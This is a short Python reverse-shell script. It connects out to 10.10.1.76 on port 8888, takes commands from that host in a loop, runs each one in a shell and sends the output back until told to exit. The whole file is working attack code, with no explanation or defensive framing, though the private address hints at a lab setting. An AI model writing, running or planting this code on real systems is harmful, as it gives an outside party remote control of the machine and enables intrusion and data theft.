import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.1.76', 8888))

while True:
    command = s.recv(4096).decode()

    if command.lower() == 'exit':
        s.close()
        break
    else:
        output = subprocess.getoutput(command)
        s.send(output.encode())
s.close()